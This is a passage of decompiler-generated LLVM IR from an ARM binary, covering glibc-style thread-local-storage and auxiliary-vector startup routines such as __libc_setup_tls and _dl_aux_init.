  store i32 %v3_195d0, i32* %stack_var_-16, align 4
  %v4_195d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_195dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_195e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 36) to i32*), align 4
  store i32 %v4_195e4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_195ec = inttoptr i32 %v4_195d4 to i32*
  %v2_195ec = load i32, i32* %v1_195ec, align 4
  %v4_195f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 52) to i32*), align 4
  store i32 %v4_195f0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_195f8 = add i32 %v2_195ec, 15
  %v4_195fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 144) to i32*), align 4
  store i32 %v4_195fc, i32* @ip, align 4
  %v1_19600 = load i32, i32* @r0, align 4
  %v2_19600 = add i32 %v1_19600, %v1_195f8
  %v1_19604 = inttoptr i32 %v4_195dc to i32*
  %v2_19604 = load i32, i32* %v1_19604, align 4
  store i32 %v2_19604, i32* %r3.global-to-local, align 4
  %v1_19608 = and i32 %v2_19600, -16
  store i32 %v1_19608, i32* %v1_195ec, align 4
  %v0_19610 = load i32, i32* @r0, align 4
  %v1_19610 = load i32, i32* %r4.global-to-local, align 4
  %v2_19610 = inttoptr i32 %v1_19610 to i32*
  store i32 %v0_19610, i32* %v2_19610, align 4
  %v0_19614 = load i32, i32* @r1, align 4
  %v1_19614 = load i32, i32* %lr.global-to-local, align 4
  %v2_19614 = inttoptr i32 %v1_19614 to i32*
  store i32 %v0_19614, i32* %v2_19614, align 4
  %v0_19618 = load i32, i32* %r3.global-to-local, align 4
  %v1_19618 = load i32, i32* @ip, align 4
  %v2_19618 = inttoptr i32 %v1_19618 to i32*
  store i32 %v0_19618, i32* %v2_19618, align 4
  %v2_1961c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1961c, i32* %r4.global-to-local, align 4
  %v1_19620 = load i32, i32* @r0, align 4
  ret i32 %v1_19620

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_19628(i32 %arg1) local_unnamed_addr {
dec_label_pc_19628:
  %v0_19628 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19628, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19628
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19628, %bb
  %v4_19638 = phi i32 [ %arg1, %dec_label_pc_19628 ], [ 0, %bb ]
  ret i32 %v4_19638

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r3.global-to-local, align 4
  %v4_1964c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 84) to i32*), align 4
  store i32 %v4_1964c, i32* @lr, align 4
  %v4_19658 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 10752) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 10752), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_19678 = inttoptr i32 %v4_19658 to i32*
  store i32 1, i32* %v2_19678, align 4
  %v0_1967c = load i32, i32* %r3.global-to-local, align 4
  %v1_1967c = load i32, i32* @lr, align 4
  %v2_1967c = inttoptr i32 %v1_1967c to i32*
  store i32 %v0_1967c, i32* %v2_1967c, align 4
  %v0_19680 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_19698(i32 %arg1) local_unnamed_addr {
dec_label_pc_19698:
  %v0_19698 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19698, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19698
  %v2_19698 = load i32, i32* @r4, align 4
  %v8_19698 = ashr i32 %v2_19698, %arg1
  %v9_19698 = and i32 %v8_19698, %arg1
  %v2_1969c = load i32, i32* @ip, align 4
  %v8_1969c = lshr i32 %v2_1969c, %v9_19698
  %v9_1969c = and i32 %v8_1969c, %v9_19698
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19698, %bb
  %v7_196a0 = phi i32 [ %arg1, %dec_label_pc_19698 ], [ %v9_1969c, %bb ]
  ret i32 %v7_196a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_196ac = call i32 @__aeabi_read_tp()
  %v1_196b0 = inttoptr i32 %v0_196ac to i32*
  %v2_196b0 = load i32, i32* %v1_196b0, align 4
  %v1_196b4 = add i32 %arg1, 4
  %v2_196b4 = inttoptr i32 %v1_196b4 to i32*
  %v3_196b4 = load i32, i32* %v2_196b4, align 4
  %v1_196b8 = add i32 %v2_196b0, 8
  %v2_196b8 = inttoptr i32 %v1_196b8 to i32*
  %v3_196b8 = load i32, i32* %v2_196b8, align 4
  %v2_196bc = add i32 %v3_196b8, %v3_196b4
  ret i32 %v2_196bc
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_196c8 = load i32, i32* @r4, align 4
  store i32 %v3_196c8, i32* %stack_var_-36, align 4
  %v6_196c8 = load i32, i32* @r5, align 4
  %v15_196c8 = load i32, i32* @r8, align 4
  %v18_196c8 = load i32, i32* @sb, align 4
  %v21_196c8 = load i32, i32* @sl, align 4
  %v24_196c8 = load i32, i32* @fp, align 4
  %v27_196c8 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %sl.global-to-local, align 4
  %v4_196d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 104) to i32*), align 4
  store i32 %v4_196d8, i32* %r3.global-to-local, align 4
  %v1_196dc = inttoptr i32 %v4_196d8 to i32*
  %v2_196dc = load i32, i32* %v1_196dc, align 4
  store i32 %v2_196dc, i32* %r2.global-to-local, align 4
  %v2_196e0 = icmp eq i32 %v2_196dc, 0
  %v0_196e8 = load i32, i32* %r0.global-to-local, align 4
  %v0_196ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_196ec, i32* %ip.global-to-local, align 4
  br i1 %v2_196e0, label %dec_label_pc_198b4, label %dec_label_pc_196f4

dec_label_pc_196f4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_196f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 156) to i32*), align 4
  store i32 %v4_196f8, i32* @lr, align 4
  store i32 %v2_196dc, i32* %r1.global-to-local, align 4
  %v1_19740 = inttoptr i32 %v4_196f8 to i32*
  %v2_1974061 = load i32, i32* %v1_19740, align 4
  %v4_1974462 = mul i32 %v2_1974061, 32
  %v5_1974463 = add i32 %v4_1974462, %v2_196dc
  store i32 %v5_1974463, i32* %r3.global-to-local, align 4
  %v3_1974865 = icmp ult i32 %v2_196dc, %v5_1974463
  br i1 %v3_1974865, label %dec_label_pc_19704, label %dec_label_pc_198b4.loopexit

dec_label_pc_19704:                               ; preds = %dec_label_pc_196f4, %dec_label_pc_1973c
  %v0_1971c66 = phi i32 [ %v1_1973c, %dec_label_pc_1973c ], [ %v2_196dc, %dec_label_pc_196f4 ]
  %v1_19704 = inttoptr i32 %v0_1971c66 to i32*
  %v2_19704 = load i32, i32* %v1_19704, align 4
  store i32 %v2_19704, i32* %r3.global-to-local, align 4
  %v7_19708 = icmp eq i32 %v2_19704, 7
  br i1 %v7_19708, label %dec_label_pc_19710, label %dec_label_pc_1973c

dec_label_pc_19710:                               ; preds = %dec_label_pc_19704
  %v1_19710 = add i32 %v0_1971c66, 20
  %v2_19710 = inttoptr i32 %v1_19710 to i32*
  %v3_19710 = load i32, i32* %v2_19710, align 4
  store i32 %v3_19710, i32* %r3.global-to-local, align 4
  %v1_19714 = add i32 %v0_1971c66, 28
  %v2_19714 = inttoptr i32 %v1_19714 to i32*
  %v3_19714 = load i32, i32* %v2_19714, align 4
  store i32 %v3_19714, i32* @r6, align 4
  %v1_1971c = add i32 %v0_1971c66, 16
  %v2_1971c = inttoptr i32 %v1_1971c to i32*
  %v3_1971c = load i32, i32* %v2_1971c, align 4
  store i32 %v3_1971c, i32* %r3.global-to-local, align 4
  %v1_19720 = add i32 %v0_1971c66, 8
  %v2_19720 = inttoptr i32 %v1_19720 to i32*
  %v3_19720 = load i32, i32* %v2_19720, align 4
  store i32 %v3_19720, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_19714, %v0_196ec
  %v0_196ec.v3_19714 = select i1 %tmp78, i32 %v0_196ec, i32 %v3_19714
  store i32 %v0_196ec.v3_19714, i32* %fp.global-to-local, align 4
  %v2_19758 = icmp eq i32 %v3_19714, 0
  br i1 %v2_19758, label %dec_label_pc_19780, label %bb

dec_label_pc_1973c:                               ; preds = %dec_label_pc_19704
  %v1_1973c = add i32 %v0_1971c66, 32
  store i32 %v1_1973c, i32* %r1.global-to-local, align 4
  %v2_19740 = load i32, i32* %v1_19740, align 4
  %v4_19744 = mul i32 %v2_19740, 32
  %v5_19744 = add i32 %v4_19744, %v2_196dc
  store i32 %v5_19744, i32* %r3.global-to-local, align 4
  %v3_19748 = icmp ult i32 %v1_1973c, %v5_19744
  br i1 %v3_19748, label %dec_label_pc_19704, label %dec_label_pc_19740.dec_label_pc_198b4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_19710
  %v2_1975c = add i32 %v3_19714, -1
  br label %dec_label_pc_19784

dec_label_pc_19780:                               ; preds = %dec_label_pc_19710, %dec_label_pc_198b4
  %v0_19794.pre = phi i32 [ %v0_19794.pre.pre, %dec_label_pc_198b4 ], [ ptrtoint (i32* @global_var_24478.766 to i32), %dec_label_pc_19710 ]
  %v1_19784.pre = phi i32 [ %v1_19784.pre.pre, %dec_label_pc_198b4 ], [ %v0_196e8, %dec_label_pc_19710 ]
  %v1_197a825 = phi i32 [ %v0_198bc, %dec_label_pc_198b4 ], [ %v0_196ec.v3_19714, %dec_label_pc_19710 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_198b4 ], [ %v3_19710, %dec_label_pc_19710 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_198b4 ], [ %v3_1971c, %dec_label_pc_19710 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_198b4 ], [ %v3_19720, %dec_label_pc_19710 ]
  br label %dec_label_pc_19784

dec_label_pc_19784:                               ; preds = %bb, %dec_label_pc_19780
  %storemerge80 = phi i32 [ %v2_1975c, %bb ], [ 0, %dec_label_pc_19780 ]
  %v0_19784 = phi i32 [ %v2_1975c, %bb ], [ 0, %dec_label_pc_19780 ]
  %storemerge = phi i32 [ %v3_19714, %bb ], [ 1, %dec_label_pc_19780 ]
  %storemerge79 = phi i32 [ %v3_19714, %bb ], [ 1, %dec_label_pc_19780 ]
  %v0_19794 = phi i32 [ ptrtoint (i32* @global_var_24478.766 to i32), %bb ], [ %v0_19794.pre, %dec_label_pc_19780 ]
  %v1_19784 = phi i32 [ %v0_196e8, %bb ], [ %v1_19784.pre, %dec_label_pc_19780 ]
  %v1_197a8 = phi i32 [ %v0_196ec.v3_19714, %bb ], [ %v1_197a825, %dec_label_pc_19780 ]
  %stack_var_-52.3 = phi i32 [ %v3_19710, %bb ], [ %stack_var_-52.0, %dec_label_pc_19780 ]
  %stack_var_-48.3 = phi i32 [ %v3_1971c, %bb ], [ %stack_var_-48.0, %dec_label_pc_19780 ]
  %stack_var_-44.3 = phi i32 [ %v3_19720, %bb ], [ %stack_var_-44.0, %dec_label_pc_19780 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_19784 = add i32 %v1_19784, %v0_19784
  %v2_19788 = udiv i32 %v2_19784, %storemerge
  store i32 %v2_19788, i32* %r0.global-to-local, align 4
  %v2_1978c = mul i32 %v2_19788, %storemerge
  store i32 %v2_1978c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_19794 = add i32 %v0_19794, 72
  %v3_19794 = inttoptr i32 %v2_19794 to i32*
  %v4_19794 = load i32, i32* %v3_19794, align 4
  store i32 %v4_19794, i32* %r3.global-to-local, align 4
  %v1_19798 = inttoptr i32 %v4_19794 to i32*
  %v2_19798 = load i32, i32* %v1_19798, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_197a0 = add i32 %v1_197a8, 1168
  %v2_197a4 = add i32 %v1_197a0, %stack_var_-52.3
  %v2_197a8 = add i32 %v2_197a4, %v2_1978c
  %v2_197ac = add i32 %v2_197a8, %v2_19798
  store i32 %v2_197ac, i32* %r0.global-to-local, align 4
  %v1_197b0 = call i32 @__GI_sbrk(i32 %v2_197ac)
  %v1_197b4 = load i32, i32* %fp.global-to-local, align 4
  %v1_197bc = sub i32 0, %v1_197b4
  store i32 10240, i32* %r4.global-to-local, align 4
  %v2_197b4 = add i32 %v1_197b0, 1167
  %v1_197c4 = add i32 %v2_197b4, %v1_197b4
  %v2_197c8 = and i32 %v1_197c4, %v1_197bc
  store i32 %v2_197c8, i32* @r5, align 4
  %v1_197d0 = load i32, i32* %sl.global-to-local, align 4
  %v3_197d0 = add i32 %v1_197d0, 10240
  %v4_197d0 = inttoptr i32 %v3_197d0 to i32*
  store i32 62, i32* %v4_197d0, align 4
  %v0_197d8 = load i32, i32* @r5, align 4
  %v1_197d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_197d8 = add i32 %v1_197d8, %v0_197d8
  store i32 %v2_197d8, i32* @ip, align 4
  %v0_197dc = load i32, i32* %sl.global-to-local, align 4
  %v1_197dc = load i32, i32* %r4.global-to-local, align 4
  %v2_197dc = add i32 %v1_197dc, %v0_197dc
  store i32 %v2_197dc, i32* %r4.global-to-local, align 4
  %v2_197e0 = add i32 %v0_197dc, 11528
  store i32 %v2_197e0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_197d8, i32* @r0, align 4
  %v2_197f4 = add i32 %v2_197dc, 16
  %v3_197f4 = inttoptr i32 %v2_197f4 to i32*
  store i32 %v2_197d8, i32* %v3_197f4, align 4
  %v0_197f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_197f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_197f8 = add i32 %v1_197f8, 40
  %v3_197f8 = inttoptr i32 %v2_197f8 to i32*
  store i32 %v0_197f8, i32* %v3_197f8, align 4
  %v0_197fc = load i32, i32* @r3, align 4
  %v1_197fc = trunc i32 %v0_197fc to i8
  %v2_197fc = load i32, i32* %r4.global-to-local, align 4
  %v3_197fc = add i32 %v2_197fc, 20
  %v4_197fc = inttoptr i32 %v3_197fc to i8*
  store i8 %v1_197fc, i8* %v4_197fc, align 1
  %v0_19800 = load i32, i32* %r4.global-to-local, align 4
  %v1_19800 = add i32 %v0_19800, 8
  store i32 %v1_19800, i32* @r4, align 4
  %v0_19804 = call i32 @memcpy()
  %v0_1980c = load i32, i32* @r4, align 4
  %v1_1980c = load i32, i32* @r5, align 4
  %v2_1980c = inttoptr i32 %v1_1980c to i32*
  store i32 %v0_1980c, i32* %v2_1980c, align 4
  %v0_19810 = load i32, i32* @r5, align 4
  store i32 %v0_19810, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_19810, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_15318.961 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_19824 = load i32, i32* %sl.global-to-local, align 4
  %v2_19824 = add i32 %v0_19824, 84
  %v3_19824 = inttoptr i32 %v2_19824 to i32*
  %v4_19824 = load i32, i32* %v3_19824, align 4
  store i32 %v4_19824, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10752, i32* %r1.global-to-local, align 4
  %v2_19830 = add i32 %v0_19824, 60
  %v3_19830 = inttoptr i32 %v2_19830 to i32*
  %v4_19830 = load i32, i32* %v3_19830, align 4
  store i32 %v4_19830, i32* %r0.global-to-local, align 4
  %v3_19838 = add i32 %v0_19824, 10752
  %v4_19838 = inttoptr i32 %v3_19838 to i32*
  store i32 64, i32* %v4_19838, align 4
  %v1_19840 = load i32, i32* %r8.global-to-local, align 4
  %v2_19840 = add i32 %v1_19840, 20
  %v3_19840 = inttoptr i32 %v2_19840 to i32*
  store i32 %stack_var_-44.3, i32* %v3_19840, align 4
  %v1_19848 = load i32, i32* %r8.global-to-local, align 4
  %v2_19848 = add i32 %v1_19848, 24
  %v3_19848 = inttoptr i32 %v2_19848 to i32*
  store i32 %stack_var_-48.3, i32* %v3_19848, align 4
  %v1_19850 = load i32, i32* %r0.global-to-local, align 4
  %v2_19850 = inttoptr i32 %v1_19850 to i32*
  store i32 1, i32* %v2_19850, align 4
  %v1_19858 = load i32, i32* %r8.global-to-local, align 4
  %v2_19858 = add i32 %v1_19858, 28
  %v3_19858 = inttoptr i32 %v2_19858 to i32*
  store i32 %stack_var_-52.3, i32* %v3_19858, align 4
  %v0_19860 = load i32, i32* @r6, align 4
  %v2_19860 = icmp eq i32 %v0_19860, 0
  %v1_19864 = load i32, i32* %r8.global-to-local, align 4
  %v2_19864 = add i32 %v1_19864, 44
  %v3_19864 = inttoptr i32 %v2_19864 to i32*
  store i32 1, i32* %v3_19864, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1986c = load i32, i32* %sl.global-to-local, align 4
  %v1_1986c = load i32, i32* %r1.global-to-local, align 4
  %v2_1986c = add i32 %v1_1986c, %v0_1986c
  store i32 %v2_1986c, i32* %r2.global-to-local, align 4
  %v1_19870 = load i32, i32* @r6, align 4
  br i1 %v2_19860, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_19784
  store i32 %v1_19870, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1987c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1987c35 = add i32 %v1_1987c34, 32
  %v3_1987c36 = inttoptr i32 %v2_1987c35 to i32*
  store i32 %v1_19870, i32* %v3_1987c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_19784
  %v2_19874 = add i32 %v1_19870, -1
  store i32 %v2_19874, i32* %r0.global-to-local, align 4
  %v1_1987c = load i32, i32* %r8.global-to-local, align 4
  %v2_1987c = add i32 %v1_1987c, 32
  %v3_1987c = inttoptr i32 %v2_1987c to i32*
  store i32 %v1_19870, i32* %v3_1987c, align 4
  %v1_19880 = load i32, i32* @r6, align 4
  store i32 %v1_19880, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_19884 = load i32, i32* %r8.global-to-local, align 4
  %v1_19884 = load i32, i32* %r2.global-to-local, align 4
  %v2_19884 = add i32 %v1_19884, 28
  %v3_19884 = inttoptr i32 %v2_19884 to i32*
  store i32 %v0_19884, i32* %v3_19884, align 4
  %v0_19888 = load i32, i32* %r2.global-to-local, align 4
  %v1_19888 = load i32, i32* %ip.global-to-local, align 4
  %v2_19888 = inttoptr i32 %v1_19888 to i32*
  store i32 %v0_19888, i32* %v2_19888, align 4
  %v0_1988c = load i32, i32* %r0.global-to-local, align 4
  %v1_1988c = load i32, i32* %r3.global-to-local, align 4
  %v2_1988c = add i32 %v1_1988c, %v0_1988c
  store i32 %v2_1988c, i32* %r0.global-to-local, align 4
  %v1_19890 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_19860, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_19898.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_19898 = phi i32 [ %v0_19898.pre, %._crit_edge ], [ %v1_19890, %bb54 ]
  %v2_19894 = udiv i32 %v2_1988c, %v1_19890
  %v2_19898 = load i32, i32* %sb.global-to-local, align 4
  %v3_19898 = mul i32 %v2_19894, %v0_19898
  %v4_19898 = add i32 %v2_19898, %v3_19898
  store i32 %v4_19898, i32* @r0, align 4
  %v0_1989c = load i32, i32* %fp.global-to-local, align 4
  %v2_1989c = icmp ult i32 %v0_1989c, 16
  %v0_1989c. = select i1 %v2_1989c, i32 16, i32 %v0_1989c
  store i32 %v0_1989c., i32* @r1, align 4
  %v2_198ac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_198ac, i32* @r4, align 4
  store i32 %v6_196c8, i32* @r5, align 4
  store i32 %v15_196c8, i32* %r8.global-to-local, align 4
  store i32 %v18_196c8, i32* %sb.global-to-local, align 4
  store i32 %v21_196c8, i32* %sl.global-to-local, align 4
  store i32 %v24_196c8, i32* %fp.global-to-local, align 4
  store i32 %v27_196c8, i32* @lr, align 4
  %v0_198b0 = call i32 @init_static_tls()
  store i32 %v0_198b0, i32* %r0.global-to-local, align 4
  %v0_198bc.pre = load i32, i32* @ip, align 4
  %v1_19784.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_19794.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_198b4

dec_label_pc_19740.dec_label_pc_198b4.loopexit_crit_edge: ; preds = %dec_label_pc_1973c
  br label %dec_label_pc_198b4.loopexit

dec_label_pc_198b4.loopexit:                      ; preds = %dec_label_pc_19740.dec_label_pc_198b4.loopexit_crit_edge, %dec_label_pc_196f4
  br label %dec_label_pc_198b4

dec_label_pc_198b4:                               ; preds = %dec_label_pc_198b4.loopexit, %entry, %bb55
  %v0_19794.pre.pre = phi i32 [ ptrtoint (i32* @global_var_24478.766 to i32), %dec_label_pc_198b4.loopexit ], [ ptrtoint (i32* @global_var_24478.766 to i32), %entry ], [ %v0_19794.pre.pre.pre, %bb55 ]
  %v1_19784.pre.pre = phi i32 [ %v0_196e8, %dec_label_pc_198b4.loopexit ], [ %v0_196e8, %entry ], [ %v1_19784.pre.pre.pre, %bb55 ]
  %v0_198bc = phi i32 [ %v0_196ec, %dec_label_pc_198b4.loopexit ], [ %v0_196ec, %entry ], [ %v0_198bc.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_198bc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_19780

; uselistorder directives
  uselistorder i32 %v0_198bc, { 1, 0 }
  uselistorder i32 %v1_19870, { 1, 0, 2, 3 }
  uselistorder i32 %v0_197dc, { 1, 0 }
  uselistorder i32 %v2_197d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1973c, { 2, 1, 0 }
  uselistorder i32 %v3_19714, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1971c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_19740, { 1, 0 }
  uselistorder i32 %v0_196ec, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_196e8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_196dc, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10752, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 7, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 10240, { 3, 4, 8, 5, 9, 2, 10, 1, 11, 6, 12, 7, 13, 0, 14 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_198b4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_19784, { 1, 0 }
  uselistorder label %dec_label_pc_19780, { 1, 0 }
  uselistorder label %dec_label_pc_19704, { 1, 0 }
}

define i32 @function_198d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_198d4:
  %v0_198d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_198d4, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_198d4
  %v1_198d8 = load i32, i32* @ip, align 4
  %v1_198e8 = load i32, i32* @r5, align 4
  %v2_198e8 = and i32 %v1_198e8, 104688
  %v2_198ec = load i32, i32* @r4, align 4
  %v8_198ec = ashr i32 %v2_198ec, %v2_198e8
  %v9_198ec = and i32 %v8_198ec, %v2_198e8
  %v8_198f0 = lshr i32 %v1_198d8, %v9_198ec
  %v9_198f0 = and i32 %v8_198f0, %v9_198ec
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_198d4, %bb
  %v7_198f4 = phi i32 [ %arg1, %dec_label_pc_198d4 ], [ %v9_198f0, %bb ]
  ret i32 %v7_198f4

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_19900 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_19900
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v4_19910 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 156) to i32*), align 4
  %v4_19918 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 104) to i32*), align 4
  store i32 %v4_19918, i32* %r1.global-to-local, align 4
  %v1_1991c = add i32 %arg1, 44
  %v2_1991c = inttoptr i32 %v1_1991c to i32*
  %v3_1991c = load i32, i32* %v2_1991c, align 4
  %v1_19920 = add i32 %arg1, 28
  %v2_19920 = inttoptr i32 %v1_19920 to i32*
  %v3_19920 = load i32, i32* %v2_19920, align 4
  store i32 %v3_19920, i32* %r2.global-to-local, align 4
  %v2_19924 = inttoptr i32 %v4_19910 to i32*
  store i32 %v3_1991c, i32* %v2_19924, align 4
  %v0_19928 = load i32, i32* %r2.global-to-local, align 4
  %v1_19928 = load i32, i32* %r1.global-to-local, align 4
  %v2_19928 = inttoptr i32 %v1_19928 to i32*
  store i32 %v0_19928, i32* %v2_19928, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 6, 10, 3, 7, 4, 8, 5, 9 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_19934(i32 %arg1) local_unnamed_addr {
dec_label_pc_19934:
  %v0_19934 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19934, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19934
  %v1_19934 = load i32, i32* @ip, align 4
  %v3_19934 = mul i32 %v1_19934, %arg1
  %v2_19938 = load i32, i32* @r8, align 4
  %v4_19938 = and i32 %v2_19938, %v3_19934
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19934, %bb
  %v5_19938 = phi i32 [ %arg1, %dec_label_pc_19934 ], [ %v4_19938, %bb ]
  ret i32 %v5_19938

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
